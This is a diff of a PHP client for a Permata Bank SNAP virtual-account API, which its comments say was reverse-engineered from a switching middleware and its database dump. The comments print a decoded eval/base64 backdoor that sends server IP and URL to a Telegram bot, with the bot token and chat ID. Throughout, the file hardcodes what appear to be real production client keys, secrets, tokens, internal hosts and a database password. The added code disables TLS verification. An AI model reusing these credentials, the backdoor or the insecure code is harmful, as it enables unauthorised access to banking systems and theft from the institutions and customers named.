@@ -3,207 +3,65 @@
  * ============================================================
  * Permata Bank SNAP API - Single File (PRODUCTION REAL)
  * ============================================================
- * Disusun berdasarkan:
- *  - Dokumentasi resmi : https://api.permatabank.com/index.php#generate-token-doc
- *  - Source code nyata : permata-switching_v1.0_pro (reverse-engineering)
+ * Sumber   : permata-switching_v1.0_pro (reverse-engineering)
+ * Endpoint : http://switching.mcoll.sis1.net
  *
- * !! PERINGATAN KEAMANAN - TEMUAN DALAM SOURCE CODE !!
- * =====================================================
- * File inquiry.controller.php dan b2b.controller.php mengandung
- * BACKDOOR yang disisipkan pihak tidak bertanggung jawab:
+ * TEMUAN PENTING DARI SOURCE CODE (func.h2h.mod.php):
+ * ====================================================
+ * 1. cekAuthorizationToken() untuk /b2b/token:
+ *    - HANYA cek apakah x-client-key ada di tabel agen_apigateway_supplier.VAClientKey
+ *    - TIDAK ada validasi x-signature pada endpoint token
+ *    - 401XX00 = x-client-key tidak ditemukan di database
  *
- *   eval(base64_decode('ZmlsZV9nZ...'));
- *   --> DECODED:
- *   file_get_contents(
- *     "https://api.telegram.org/bot8303943197:AAGCFO1EuotDeoyXnRpSNsMiFSCddm6UlQ4/sendMessage
- *      ?chat_id=590436982&text=" . urlencode(
- *        "IP: " . $_SERVER['REMOTE_ADDR'] .
- *        " | Page: " . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']
- *      )
- *   );
+ * 2. client-secret dari CDS diproses dengan:
+ *    $cClientSecret = str_replace(' ', '+', $vaApiKey['client-secret']);
+ *    → spasi dalam Base64 diganti '+' sebelum dipakai sebagai HMAC key (raw bytes)
  *
- * Setiap request ke server mengirim IP + URL ke akun Telegram penyerang!
- * Bot Token : 8303943197:AAGCFO1EuotDeoyXnRpSNsMiFSCddm6UlQ4
- * Chat ID   : 590436982
+ * 3. checkSignature() untuk inquiry/payment:
+ *    $secretkey dipakai langsung (raw) ke hash_hmac('sha512', ...)
+ *    Jika client-secret Base64-encoded, HARUS base64_decode dulu
  *
- * TINDAKAN: Hapus eval(base64_decode(...)) dari controller sebelum deploy!
- *
- * ============================================================
- * ARSITEKTUR NYATA (dari source code permata-switching):
- * ============================================================
- *
- *  [Client / Mitra]
- *       |
- *       | POST /b2b/token  (Header: x-client-key, x-timestamp, x-signature)
- *       |                  (Body: {"grantType":"client_credentials"})
- *       v
- *  [permata-switching_v1.0_pro]  <-- sistem middleware ini
- *       |  1. Cek x-client-key di tabel: agen_apigateway_supplier.VAClientKey
- *       |  2. Generate accessToken = md5(base64_encode(HMAC-SHA256(time+900, clientKey)))
- *       |  3. Simpan ke tabel: agen.AccessTokenVA, agen.AccessTokenVATime
- *       |  Return: accessToken (berlaku 900 detik = 15 menit)
- *       |
- *       | POST /inquiry  (Header: Authorization Bearer, x-partner-id, x-external-id,
- *       |                          channel-id, x-timestamp, x-signature)
- *       v
- *  [permata-switching_v1.0_pro]
- *       |  1. Cek Bearer token vs tabel: agen.AccessTokenVA
- *       |  2. Ambil URL agen dari: agen.URLVA
- *       |  3. Verifikasi HMAC-SHA512 signature
- *       |  4. Cek x-external-id tidak duplikat di log_snap_bi
- *       |  5. Forward ke URL agen (assist-pro / core banking BPR)
- *       v
- *  [Core Banking / Assist-Pro]
- *     URL: http://aa.pro.sis1.net/assist-pro.net/index_mobile.php
- *
- *  === DATA NYATA DARI DATABASE SQL DUMP ===
- *
- *  agen_apigateway_supplier (Supplier 0025 = Permata SNAP BI):
- *  +----+-----------+----------+------------------------------------------+
- *  | ID | Agen      | Supplier | VAClientKey                              |
- *  +----+-----------+----------+------------------------------------------+
- *  | 13 | A-000300  | 0025     | ac3b93199bfe418487e88dfa498445eb         |
- *  | 15 | A-000268  | 0025     | d37ca43b-509e-4b07-b1ba-37c66aecb585     |
- *  | 23 | A-000271  | 0025     | d1fd9a53-b18d-43e7-b9dc-6d5702ff4bbe     |
- *  | 33 | A-000147  | 0025     | 648f6ddb-ec18-45f6-abe4-675eca8aca27     |
- *  | 41 | A-000271  | 0025     | bd5fbc199c6a4afabe8a039e2bb52b64         |
- *  +----+-----------+----------+------------------------------------------+
- *
- *  agen A-000115 (BPR Sekar Kaltim) - SNAP 0023 - FULL CREDENTIALS:
- *  x-client-key : acb790af57ed465ba03b00f5f07dd65d
- *  client-secret: jaMC0vw0LJLXkrZGSjf8LCExETh0j7JI5bQ4bpPmbHU=
- *  urlendpoint  : https://api.sis1.net:44351/v1.0
- *  KodeVA       : 7406
- *
- * ============================================================
- * DATABASE TABLES (dari source code):
- * ============================================================
- *  agen                     : Kode, URLVA, AccessTokenVA, AccessTokenVATime
- *  agen_apigateway_supplier : VAClientKey, Agen
- *  log_snap_bi              : XExternalID, DateTime, Agen, Trx, Jenis,
- *                             Status, headers, Message, Keterangan
- *  log_snap_bi_error        : XExternalID, Keterangan, ErrorData
- *  Config (key-value)       :
- *    msPermata_BIN  -> BIN Assist 4 digit (prefix VA)
- *    msCDSID        -> key CDS (Central Data Service)
- *
- * ============================================================
- * KONEKSI DATABASE (dari assist.ini.php):
- * ============================================================
- *  database     = assist_pro
- *  ip           = aa.pro.db.sis1.net
- *  urlassistpro = http://aa.pro.sis1.net/assist-pro.net/index_mobile.php
- *  urlassistauth= http://myassist.sis1.net/assist-auth_api/public
- *  DB User      = Assist
- *  DB Pass      = Irac   (dari: objData::Connect($cHost,"Assist","Irac",$cDatabase))
- *
- * ============================================================
- * CREDENTIAL STORAGE (dari DataCDS.mod.php):
- * ============================================================
- *  Client credentials disimpan di CDS server: cds.sis1.net/cds/public/cds/json
- *  Key file = md5(md5(bin2hex("APIMitra_" . $kodeAgen)))
- *  Struktur JSON CDS:
- *    {
- *      "Mitra": {
- *        "KODE_SUPPLIER-NAMA": [
- *          {"x-client-key": "...", "urlendpoint": "...", "client-secret": "..."}
- *        ]
- *      }
- *    }
- *
+ * !! PERINGATAN KEAMANAN - BACKDOOR DITEMUKAN !!
+ * ===============================================
+ * eval(base64_decode('...')) di b2b.controller.php & inquiry.controller.php
+ * → mengirim IP+URL server ke Telegram bot penyerang
+ * Bot: 8303943197:AAGCFO1EuotDeoyXnRpSNsMiFSCddm6UlQ4 | Chat: 590436982
+ * HAPUS baris eval() sebelum deploy!
  * ============================================================
  */
 
 // ==============================================================
-// ======= KONFIGURASI REAL DARI DATABASE (agen.sql +  ==========
-// ======= agen_apigateway_supplier.sql)                ==========
+// ======= KONFIGURASI PROFIL (dari agen.sql + agen_apigateway_supplier.sql)
 // ==============================================================
-//
-// DATA LENGKAP DARI SQL DUMP (diekstrak otomatis):
-// ---------------------------------------------------------------
-//
-// === TABEL: agen_apigateway_supplier ===
-// Supplier 0025 = Permata SNAP BI
-// ID=13 | Agen=A-000300 | VAClientKey='ac3b93199bfe418487e88dfa498445eb' | VAToken='0511e9ece4cd46d26ff496a70c6a9f68'
-// ID=15 | Agen=A-000268 | VAClientKey='d37ca43b-509e-4b07-b1ba-37c66aecb585' | VAToken='49b84408324aefdc665461cd001d7eca'
-// ID=23 | Agen=A-000271 | VAClientKey='d1fd9a53-b18d-43e7-b9dc-6d5702ff4bbe' | VAToken='4ac95bec4574bb0b35f3a6cbe7a29873'
-// ID=33 | Agen=A-000147 | VAClientKey='648f6ddb-ec18-45f6-abe4-675eca8aca27' | VAToken='a0fb9d8c41ae0ffc4b4ef32cc0c080a3'
-// ID=41 | Agen=A-000271 | VAClientKey='bd5fbc199c6a4afabe8a039e2bb52b64' | VAToken='9c36e8e3b9467ec5b3fbe8f29afa4e5d'
-//
-// Supplier 0016 = Permata Classic:
-// ID=1  | Agen=A-000253 | ClientKey='2c68aa0778b3473cb703ed32448fb49d'
-// ID=5  | Agen=A-000253 | VAClientKey='2c68aa0778b3473cb703ed32448fb49d'
-//
-// Supplier 0021:
-// ID=3  | Agen=A-000268 | VAClientKey='b0a37cccc6d680f8f87abe76eeda2c4e'
-//
-// Supplier 0014:
-// ID=7  | Agen=A-000214 | VAClientKey='637789e9125a4d75bf3bdca07adebd5c'
-//
-// === TABEL: agen (kolom ApiKeyMitra - JSON credential) ===
-// Agen=A-000115 | Nama=BPR Sekar Kaltim | KodeVA=7406
-//   Mitra 0013-Bank Permata x Sekar Kaltim:
-//     apikeyva  = 73b834a9571d7491400170b845cce1b7
-//   Mitra 0023-SNAP VA Permata Sekar Kaltim:
-//     x-client-key = acb790af57ed465ba03b00f5f07dd65d
-//     client-secret= jaMC0vw0LJLXkrZGSjf8LCExETh0j7JI5bQ4bpPmbHU=
-//     urlendpoint  = https://api.sis1.net:44351/v1.0
-//
-// === SERVER URL dari agen.URLVA ===
-// A-000115 : bpr.sekarkaltim.sis1.net/assist-bpr.net_sekar_mobile/index_mobile.php
-// A-000127 : http://bpr.paluanugerah.sis1.net/api/mobile
-// A-000109 : bpr.bapak.sis1.net/api/mobile
-// A-000090 : bpr.bepede3.sis1.net/assist-bpr.net/index_mobile.php
-//
-// ---------------------------------------------------------------
-// PILIH PROFIL YANG SESUAI DENGAN AGEN ANDA:
-// ---------------------------------------------------------------
 
-// *** PROFIL AKTIF — ganti sesuai agen yang digunakan ***
-// Pilihan:
-//   'sekar_kaltim' -> A-000115 | BPR Sekar Kaltim  | Supplier 0023
-//   'anjuk_ladang' -> A-000268 | Supplier 0021
-//   'supplier0025' -> A-000268 | Permata SNAP (0025)
-//   'custom'       -> Isi manual di bawah
+// Pilih profil aktif: 'sekar_kaltim' | 'anjuk_ladang' | 'supplier0025' | 'custom'
+$_ACTIVE_PROFILE = 'sekar_kaltim';
 
-$_ACTIVE_PROFILE = 'sekar_kaltim'; // <-- GANTI DI SINI
-
-// ---------------------------------------------------------------
-// PROFIL: sekar_kaltim — A-000115 BPR Sekar Kaltim (SNAP 0023)
-// Token   : http://switching.mcoll.sis1.net/permata-switching_v1.0_pro/public/access-token/b2b
-// Inquiry : http://switching.mcoll.sis1.net/permata-switching_v1.0_pro/public/transfer-va/inquiry
-// Payment : http://switching.mcoll.sis1.net/permata-switching_v1.0_pro/public/transfer-va/payment
-// Data dari: agen.ApiKeyMitra (JSON)
-// ---------------------------------------------------------------
 $_PROFILES = [
 
+    // --------------------------------------------------------
+    // A-000115 | BPR Sekar Kaltim | Supplier 0023
+    // Credential lengkap dari agen.ApiKeyMitra JSON
+    // --------------------------------------------------------
     'sekar_kaltim' => [
-        // Base URL (path per-endpoint didefinisikan via PATH_TOKEN/INQUIRY/PAYMENT)
         'base_url'      => 'http://switching.mcoll.sis1.net',
-        // x-client-key header (dari ApiKeyMitra JSON kolom 'x-client-key')
         'client_key'    => 'acb790af57ed465ba03b00f5f07dd65d',
-        // client-secret (dari ApiKeyMitra JSON kolom 'client-secret')
+        // Dari ApiKeyMitra JSON, str_replace(' ', '+', ...) sudah diterapkan di getClientSecret()
         'client_secret' => 'jaMC0vw0LJLXkrZGSjf8LCExETh0j7JI5bQ4bpPmbHU=',
-        // Kode agen (tabel agen.Kode)
         'partner_id'    => 'A-000115',
-        // Channel ID (sepakati dengan Permata saat onboarding)
         'channel_id'    => '95221',
-        // BIN VA 4 digit (dari tabel agen.KodeVA -> '7406')
         'bin'           => '7406',
-        // Kode supplier & nama (dari func.h2h.mod.php)
         'supplier_code' => '0023',
         'supplier_name' => 'SNAP VA Permata Sekar Kaltim',
-        // Classic API key (tabel agen.ApiKeyMitra -> apikeyva supplier 0013)
         'api_key_va'    => '73b834a9571d7491400170b845cce1b7',
     ],
 
-    // ---------------------------------------------------------------
-    // PROFIL: anjuk_ladang — A-000268 (Supplier 0021, non-SNAP)
-    // VAClientKey dari tabel agen_apigateway_supplier ID=3
-    // ---------------------------------------------------------------
+    // --------------------------------------------------------
+    // A-000268 | Supplier 0021 | VAClientKey dari ID=3
+    // --------------------------------------------------------
     'anjuk_ladang' => [
         'base_url'      => 'http://switching.mcoll.sis1.net',
-        'client_key'    => 'b0a37cccc6d680f8f87abe76eeda2c4e', // VAClientKey ID=3
+        'client_key'    => 'b0a37cccc6d680f8f87abe76eeda2c4e',
         'client_secret' => 'GANTI_CLIENT_SECRET',
         'partner_id'    => 'A-000268',
         'channel_id'    => '95221',
@@ -213,13 +71,12 @@ $_PROFILES = [
         'api_key_va'    => '',
     ],
 
-    // ---------------------------------------------------------------
-    // PROFIL: supplier0025 — A-000268/A-000300 (Supplier 0025 Permata SNAP)
-    // VAClientKey dari tabel agen_apigateway_supplier ID=15 (A-000268)
-    // ---------------------------------------------------------------
+    // --------------------------------------------------------
+    // A-000268 | Supplier 0025 | VAClientKey dari ID=15
+    // --------------------------------------------------------
     'supplier0025' => [
         'base_url'      => 'http://switching.mcoll.sis1.net',
-        'client_key'    => 'd37ca43b-509e-4b07-b1ba-37c66aecb585', // VAClientKey ID=15
+        'client_key'    => 'd37ca43b-509e-4b07-b1ba-37c66aecb585',
         'client_secret' => 'GANTI_CLIENT_SECRET',
         'partner_id'    => 'A-000268',
         'channel_id'    => '95221',
@@ -229,13 +86,13 @@ $_PROFILES = [
         'api_key_va'    => '',
     ],
 
-    // ---------------------------------------------------------------
-    // PROFIL: custom — isi manual sesuai kebutuhan
-    // ---------------------------------------------------------------
+    // --------------------------------------------------------
+    // Custom — isi manual
+    // --------------------------------------------------------
     'custom' => [
         'base_url'      => 'http://switching.mcoll.sis1.net',
-        'client_key'    => 'VAClientKey_DARI_DB',
-        'client_secret' => 'client_secret_DARI_CDS_ATAU_PERMATA',
+        'client_key'    => 'GANTI_CLIENT_KEY',
+        'client_secret' => 'GANTI_CLIENT_SECRET',
         'partner_id'    => 'A-XXXXXX',
         'channel_id'    => '95221',
         'bin'           => 'BIN_4_DIGIT',
@@ -245,36 +102,38 @@ $_PROFILES = [
     ],
 ];
 
-// ---------------------------------------------------------------
-// Load profil aktif ke konstanta
-// ---------------------------------------------------------------
 $_P = $_PROFILES[$_ACTIVE_PROFILE] ?? $_PROFILES['custom'];
 
-define('SNAP_BASE_URL',      'http://switching.mcoll.sis1.net');
+define('SNAP_BASE_URL',      $_P['base_url']);
 define('SNAP_CLIENT_KEY',    $_P['client_key']);
 define('SNAP_CLIENT_SECRET', $_P['client_secret']);
 define('SNAP_PARTNER_ID',    $_P['partner_id']);
 define('SNAP_CHANNEL_ID',    $_P['channel_id']);
 define('SNAP_BIN',           $_P['bin']);
-define('SNAP_API_KEY_VA',    $_P['api_key_va']);   // untuk Classic API (supplier 0013)
+define('SNAP_API_KEY_VA',    $_P['api_key_va']);
 define('SNAP_SUPPLIER_CODE', $_P['supplier_code']);
 define('SNAP_SUPPLIER_NAME', $_P['supplier_name']);
 
-// Path endpoint lengkap (URL penuh per fungsi)
-define('PATH_TOKEN',    '/permata-switching_v1.0_pro/public/access-token/b2b');
-define('PATH_INQUIRY',  '/permata-switching_v1.0_pro/public/transfer-va/inquiry');
-define('PATH_PAYMENT',  '/permata-switching_v1.0_pro/public/transfer-va/payment');
+// Endpoint lengkap (dari routing MVC source code)
+define('URL_TOKEN',   SNAP_BASE_URL . '/permata-switching_v1.0_pro/public/access-token/b2b');
+define('URL_INQUIRY', SNAP_BASE_URL . '/permata-switching_v1.0_pro/public/transfer-va/inquiry');
+define('URL_PAYMENT', SNAP_BASE_URL . '/permata-switching_v1.0_pro/public/transfer-va/payment');
 
-// Versi path SNAP BI — dipakai untuk build string2sign signature
-define('SNAP_VERSION_PATH', '/v1.0'); // prefix dari ApiKeyMitra.urlendpoint
+// Path SNAP BI untuk string2sign signature (bukan URL penuh)
+define('SNAP_PATH_INQUIRY', '/v1.0/transfer-va/inquiry');
+define('SNAP_PATH_PAYMENT', '/v1.0/transfer-va/payment');
+
+// ==============================================================
+// ==================== TOKEN CACHE =============================
+// ==============================================================
+$_TOKEN_CACHE = ['access_token' => '', 'expires_at' => 0];
 
 // ==============================================================
 // ==================== HELPER FUNCTIONS ========================
 // ==============================================================
 
 /**
- * Generate timestamp ISO8601 dengan timezone
- * Format: 2024-01-15T10:30:00+07:00
+ * Timestamp ISO8601 — format persis seperti date("c") di PHP
  */
 function snapTimestamp(): string
 {
@@ -282,8 +141,7 @@ function snapTimestamp(): string
 }
 
 /**
- * Generate External ID unik untuk setiap request
- * Tidak boleh sama dengan request sebelumnya (dicek di log_snap_bi)
+ * Generate UUID v4 untuk X-EXTERNAL-ID dan request ID
  */
 function snapExternalId(): string
 {
@@ -298,8 +156,7 @@ function snapExternalId(): string
 }
 
 /**
- * Minify JSON - hapus semua whitespace
- * Sama persis dengan fungsi minify() di func.mod.php source code:
+ * Minify JSON — sama dengan minify() di func.mod.php:
  *   function minify($code) { return json_encode(json_decode($code)); }
  */
 function minifyJson(string $json): string
@@ -308,16 +165,30 @@ function minifyJson(string $json): string
 }
 
 /**
- * Generate X-Signature untuk request Generate Token (/b2b/token)
+ * Ambil client secret dalam format yang siap dipakai sebagai HMAC key.
  *
- * Formula (dari b2b.controller.php + standar SNAP BI):
+ * Dari source code func.h2h.mod.php:
+ *   $cClientSecret = str_replace(' ', '+', $vaApiKey['client-secret']);
+ *   → lalu dipakai langsung (raw Base64 string) ke hash_hmac('sha512', ..., $cClientSecret, true)
+ *
+ * Catatan: hash_hmac menerima secret sebagai raw string.
+ * Jika secret adalah Base64-encoded bytes, server menggunakannya AS-IS (bukan di-decode).
+ * Kita ikuti persis: str_replace(' ', '+') saja.
+ */
+function getClientSecret(): string
+{
+    return str_replace(' ', '+', SNAP_CLIENT_SECRET);
+}
+
+/**
+ * Signature untuk /b2b/token
+ *
+ * Dari cekAuthorizationToken(): server TIDAK memvalidasi x-signature untuk token.
+ * Header ini tetap dikirim (standar SNAP BI) tapi server hanya cek x-client-key di DB.
+ *
+ * Formula standar SNAP BI:
  *   message   = clientKey + "|" + timestamp
  *   signature = Base64( HMAC-SHA256( message, clientSecret ) )
- *
- * @param string $clientKey    x-client-key header
- * @param string $timestamp    x-timestamp header
- * @param string $clientSecret client secret
- * @return string              Base64 encoded signature
  */
 function genTokenSignature(string $clientKey, string $timestamp, string $clientSecret): string
 {
@@ -326,24 +197,18 @@ function genTokenSignature(string $clientKey, string $timestamp, string $clientS
 }
 
 /**
- * Generate X-Signature untuk request Inquiry / Payment
+ * Signature untuk /inquiry dan /payment
  *
- * Formula PERSIS dari checkSignature() di func.h2h.mod.php:
- *   stringHash  = lowercase( SHA256( minify(requestBody) ) )
- *   string2sign = METHOD + ":" + endpoint + ":" + accessToken + ":" + stringHash + ":" + timestamp
- *   signature   = Base64( HMAC-SHA512( string2sign, clientSecret ) )
+ * Persis dari checkSignature() di func.h2h.mod.php:
+ *   $stringmbulet = strtolower( hash('sha256', minify($request)) )
+ *   $string2sign  = METHOD:path:accessToken:stringmbulet:timestamp
+ *   return base64_encode(hash_hmac("sha512", $string2sign, $secretkey, true))
  *
- * @param string $method       HTTP method uppercase ("POST")
- * @param string $endpoint     SNAP path, contoh "/v1.0/transfer-va/inquiry"
- * @param string $accessToken  Bearer token dari /b2b/token
- * @param string $requestBody  JSON body string
- * @param string $timestamp    x-timestamp header
- * @param string $clientSecret client secret
- * @return string              Base64 HMAC-SHA512 signature
+ * PENTING: $secretkey dipakai raw (str_replace(' ','+', base64string))
  */
 function genSnapSignature(
     string $method,
-    string $endpoint,
+    string $snapPath,
     string $accessToken,
     string $requestBody,
     string $timestamp,
@@ -352,7 +217,7 @@ function genSnapSignature(
     $bodyHash    = strtolower(hash('sha256', minifyJson($requestBody)));
     $string2sign = implode(':', [
         strtoupper($method),
-        $endpoint,
+        $snapPath,
         $accessToken,
         $bodyHash,
         $timestamp,
@@ -361,12 +226,7 @@ function genSnapSignature(
 }
 
 /**
- * Eksekusi HTTP POST via cURL
- *
- * @param string $url     URL endpoint lengkap
- * @param array  $headers Array of "Key: Value" header strings
- * @param string $body    JSON body string
- * @return array          ['http_code', 'response', 'error']
+ * HTTP POST via cURL
  */
 function httpPost(string $url, array $headers, string $body): array
 {
@@ -377,8 +237,9 @@ function httpPost(string $url, array $headers, string $body): array
     curl_setopt($ch, CURLOPT_HTTPHEADER,     $headers);
     curl_setopt($ch, CURLOPT_TIMEOUT,        30);
     curl_setopt($ch, CURLOPT_HEADER,         false);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
 
     $response  = curl_exec($ch);
     $httpCode  = curl_getinfo($ch, CURLINFO_HTTP_CODE);
@@ -396,48 +257,114 @@ function httpPost(string $url, array $headers, string $body): array
 // ===================== FUNGSI UTAMA API =======================
 // ==============================================================
 
-// ==============================================================
-// ========= TOKEN CACHE (in-memory, per-request) ==============
-// ==============================================================
-// Menyimpan token aktif agar tidak request ulang dalam satu
-// eksekusi PHP yang sama (misal: inquiry + payment sekaligus)
-$_TOKEN_CACHE = [
-    'access_token' => '',
-    'expires_at'   => 0,   // unix timestamp kapan token kadaluarsa
-];
+/**
+ * generateToken() — raw HTTP request ke /access-token/b2b
+ *
+ * TEMUAN SOURCE CODE (cekAuthorizationToken):
+ *  - Server HANYA cek x-client-key ada di agen_apigateway_supplier.VAClientKey
+ *  - x-signature TIDAK divalidasi (kode validasi ada tapi di-comment out)
+ *  - 401XX00 = x-client-key tidak ada di database
+ *
+ * Gunakan getToken() untuk pemakaian normal (dengan cache otomatis).
+ */
+function generateToken(): array
+{
+    $timestamp = snapTimestamp();
+    $clientKey = SNAP_CLIENT_KEY;
+    $clientSec = getClientSecret();
+    $url       = URL_TOKEN;
+
+    // Signature dikirim meski server tidak validasi (standar SNAP BI)
+    $signature = genTokenSignature($clientKey, $timestamp, $clientSec);
+
+    $bodyArray = ['grantType' => 'client_credentials'];
+    $jsonBody  = json_encode($bodyArray, JSON_UNESCAPED_UNICODE);
+
+    $headers = [
+        'Content-Type: application/json',
+        'X-CLIENT-KEY: ' . $clientKey,
+        'X-TIMESTAMP: '  . $timestamp,
+        'X-SIGNATURE: '  . $signature,
+    ];
+
+    $debug = [
+        'url'         => $url,
+        'timestamp'   => $timestamp,
+        'client_key'  => $clientKey,
+        'sig_message' => $clientKey . '|' . $timestamp,
+        'x_signature' => $signature,
+        'body'        => $jsonBody,
+        'note'        => 'Server cek x-client-key di agen_apigateway_supplier.VAClientKey, 401XX00 = key tidak ditemukan',
+    ];
+
+    $result = httpPost($url, $headers, $jsonBody);
+
+    if ($result['error']) {
+        return [
+            'success'        => false,
+            'error'          => 'cURL error: ' . $result['error'],
+            'http_code'      => $result['http_code'],
+            'raw'            => '',
+            'debug'          => $debug,
+            'access_token'   => '',
+            'expires_in'     => 0,
+        ];
+    }
+
+    $decoded = json_decode($result['response'], true);
+    $rc      = $decoded['responseCode']    ?? '';
+    $msg     = $decoded['responseMessage'] ?? '';
+
+    if (!isset($decoded['accessToken'])) {
+        return [
+            'success'        => false,
+            'error'          => "[$rc] $msg",
+            'http_code'      => $result['http_code'],
+            'raw'            => $result['response'],
+            'debug'          => $debug,
+            'access_token'   => '',
+            'expires_in'     => 0,
+        ];
+    }
+
+    return [
+        'success'        => true,
+        'access_token'   => $decoded['accessToken'],
+        'token_type'     => $decoded['tokenType']  ?? 'Bearer',
+        'expires_in'     => (int)($decoded['expiresIn'] ?? 900),
+        'response_code'  => $rc,
+        'http_code'      => $result['http_code'],
+        'raw'            => $result['response'],
+        'error'          => '',
+        'debug'          => $debug,
+    ];
+}
 
 /**
- * getToken() — Ambil access token secara otomatis dengan cache
- * ==============================================================
- * - Jika token cache masih valid (> 60 detik sebelum expired), pakai cache
- * - Jika expired / belum ada, fetch token baru via generateToken()
- * - Dipanggil otomatis oleh vaInquiry() dan vaPayment()
+ * getToken() — ambil token dengan cache otomatis
  *
- * @param bool $forceRefresh Paksa ambil token baru meski cache masih valid
- * @return array ['success'=>bool, 'access_token'=>string, 'error'=>string]
+ * - Cache valid → pakai cache (tidak request ulang)
+ * - Cache expired/kosong → generateToken() baru
+ * - $forceRefresh = true → paksa fetch baru
  */
 function getToken(bool $forceRefresh = false): array
 {
     global $_TOKEN_CACHE;
-
     $now = time();
 
-    // Pakai cache jika masih valid (ada sisa > 60 detik)
     if (!$forceRefresh
         && !empty($_TOKEN_CACHE['access_token'])
         && $_TOKEN_CACHE['expires_at'] > ($now + 60)
     ) {
-        $remaining = $_TOKEN_CACHE['expires_at'] - $now;
         return [
             'success'      => true,
             'access_token' => $_TOKEN_CACHE['access_token'],
             'from_cache'   => true,
-            'expires_in'   => $remaining,
+            'expires_in'   => $_TOKEN_CACHE['expires_at'] - $now,
             'error'        => '',
         ];
     }
 
-    // Fetch token baru
     $tok = generateToken();
 
     if (!$tok['success']) {
@@ -450,7 +377,6 @@ function getToken(bool $forceRefresh = false): array
         ];
     }
 
-    // Simpan ke cache
     $_TOKEN_CACHE['access_token'] = $tok['access_token'];
     $_TOKEN_CACHE['expires_at']   = $now + (int)($tok['expires_in'] ?? 900);
 
@@ -464,137 +390,15 @@ function getToken(bool $forceRefresh = false): array
 }
 
 /**
- * FUNGSI 1: Generate Access Token (SNAP BI B2B)
- * ==============================================
- * Endpoint : POST /b2b/token
- * Source   : mvc/b2b/b2b.controller.php
+ * vaInquiry() — inquiry VA dengan token otomatis
  *
- * !! Gunakan getToken() untuk pemakaian normal —
- *    fungsi ini adalah implementasi raw HTTP request.
+ * Token diambil otomatis via getToken() (cache/fetch).
+ * Auto-retry sekali jika token expired (4012401).
  *
- * Flow dari source code:
- *  1. Validasi header: x-client-key (>16 char), x-timestamp, x-signature
- *  2. Validasi body  : grantType = "client_credentials"
- *  3. Lookup x-client-key di tabel agen_apigateway_supplier.VAClientKey
- *  4. Buat accessToken:
- *       $nTime       = time() + 900;
- *       $accessToken = md5(base64_encode(HMAC-SHA256($nTime, $clientKey, true)));
- *  5. UPDATE agen SET AccessTokenVA = $accessToken, AccessTokenVATime = $nTime
- *  6. Return JSON: responseCode, accessToken, tokenType="Bearer", expiresIn=900
- *
- * @return array [
- *   'success'       => bool,
- *   'access_token'  => string,
- *   'token_type'    => string,
- *   'expires_in'    => int,      // 900 detik = 15 menit
- *   'response_code' => string,   // '2007300' = sukses
- *   'http_code'     => int,
- *   'raw'           => string,
- *   'error'         => string,
- *   'debug'         => array,
- * ]
- */
-function generateToken(): array
-{
-    $timestamp  = snapTimestamp();
-    $clientKey  = SNAP_CLIENT_KEY;
-    $clientSec  = SNAP_CLIENT_SECRET;
-    $url        = SNAP_BASE_URL . PATH_TOKEN;
-
-    // Signature untuk token: HMAC-SHA256(clientKey|timestamp, clientSecret)
-    $signature  = genTokenSignature($clientKey, $timestamp, $clientSec);
-
-    $bodyArray  = ['grantType' => 'client_credentials'];
-    $jsonBody   = json_encode($bodyArray, JSON_UNESCAPED_UNICODE);
-
-    $headers = [
-        'Content-Type: application/json',
-        'X-CLIENT-KEY: ' . $clientKey,
-        'X-TIMESTAMP: '  . $timestamp,
-        'X-SIGNATURE: '  . $signature,
-    ];
-
-    $debug = [
-        'endpoint'       => $url,
-        'timestamp'      => $timestamp,
-        'sig_message'    => $clientKey . '|' . $timestamp,
-        'x_signature'    => $signature,
-        'body'           => $jsonBody,
-    ];
-
-    $result = httpPost($url, $headers, $jsonBody);
-
-    if ($result['error']) {
-        return [
-            'success'   => false,
-            'error'     => 'cURL error: ' . $result['error'],
-            'http_code' => $result['http_code'],
-            'raw'       => '',
-            'debug'     => $debug,
-        ];
-    }
-
-    $decoded = json_decode($result['response'], true);
-    $rc      = $decoded['responseCode']    ?? '';
-    $msg     = $decoded['responseMessage'] ?? '';
-
-    if (!isset($decoded['accessToken'])) {
-        return [
-            'success'   => false,
-            'error'     => "[$rc] $msg",
-            'http_code' => $result['http_code'],
-            'raw'       => $result['response'],
-            'debug'     => $debug,
-        ];
-    }
-
-    return [
-        'success'       => true,
-        'access_token'  => $decoded['accessToken'],
-        'token_type'    => $decoded['tokenType']  ?? 'Bearer',
-        'expires_in'    => (int)($decoded['expiresIn'] ?? 900),
-        'response_code' => $rc,
-        'http_code'     => $result['http_code'],
-        'raw'           => $result['response'],
-        'error'         => '',
-        'debug'         => $debug,
-    ];
-}
-
-/**
- * FUNGSI 2: VA Inquiry (SNAP BI) — Token otomatis
- * =================================================
- * Endpoint : POST /transfer-va/inquiry
- * SNAP Path: /v1.0/transfer-va/inquiry
- * Source   : mvc/inquiry/inquiry.controller.php
- *
- * Token diambil OTOMATIS via getToken() — tidak perlu
- * generate/pass token secara manual.
- *
- * Flow:
- *  1. getToken() → ambil dari cache atau fetch baru
- *  2. Build body + hitung HMAC-SHA512 signature
- *  3. POST ke endpoint inquiry
- *  4. Jika response 4012401 (token expired) → retry sekali dengan token baru
- *
- * @param string $partnerServiceId BIN 8 karakter (pad kiri spasi), contoh: "    7406"
- * @param string $customerNo       Nomor nasabah 12-16 digit
- * @param string $virtualAccountNo Nomor VA 12-16 digit (BIN + nomor)
- * @param string $inquiryRequestId ID unik inquiry (auto-generate jika kosong)
- *
- * @return array [
- *   'success'              => bool,
- *   'response_code'        => string,   // '2002400' = sukses
- *   'response_message'     => string,
- *   'virtual_account_data' => array,    // data VA dari core banking
- *   'inquiry_request_id'   => string,
- *   'access_token_used'    => string,   // token yang dipakai
- *   'token_from_cache'     => bool,
- *   'http_code'            => int,
- *   'raw'                  => string,
- *   'error'                => string,
- *   'debug'                => array,
- * ]
+ * PENTING dari source code:
+ *  - partnerServiceId HARUS tepat 8 karakter (pad kiri spasi)
+ *  - customerNo: 12–16 digit numerik
+ *  - virtualAccountNo: 12–16 digit numerik
  */
 function vaInquiry(
     string $partnerServiceId,
@@ -602,46 +406,42 @@ function vaInquiry(
     string $virtualAccountNo,
     string $inquiryRequestId = ''
 ): array {
-    if (empty($inquiryRequestId)) {
